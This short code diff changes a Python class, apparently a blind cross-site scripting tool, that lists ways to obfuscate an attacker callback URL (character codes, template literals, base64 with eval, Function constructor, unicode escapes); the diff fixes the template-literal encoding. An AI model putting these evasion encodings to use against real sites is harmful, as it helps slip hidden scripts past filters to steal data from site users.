@@ -88,7 +88,7 @@ class BlindXSSDimV2:
         ("fromchar",  lambda cb: f"String.fromCharCode({','.join(str(ord(c)) for c in cb)})",                  0.80),
         ("proto",     lambda cb: f"location.protocol+'//'+'{cb.split('//')[1] if '//' in cb else cb}'",        0.75),
         # NEW v2: Modern obfuscation
-        ("template",  lambda cb: f"`{'${\"'+cb[:5]+'\"}'}{cb[5:]}`" if len(cb) > 5 else f"'{cb}'",            0.78),
+        ("template",  lambda cb: ('`${"' + cb[:5] + '"}' + cb[5:] + '`') if len(cb) > 5 else f"'{cb}'",  0.78),
         ("eval_b64",  lambda cb: f"eval(atob('{base64.b64encode((repr(cb)).encode()).decode()}'))",             0.72),
         ("fn_ctor",   lambda cb: f"Function('return \"{cb}\"')()",                                             0.70),
         ("unicode_cb",lambda cb: "".join(f"\\u{ord(c):04x}" for c in cb),                                     0.65),
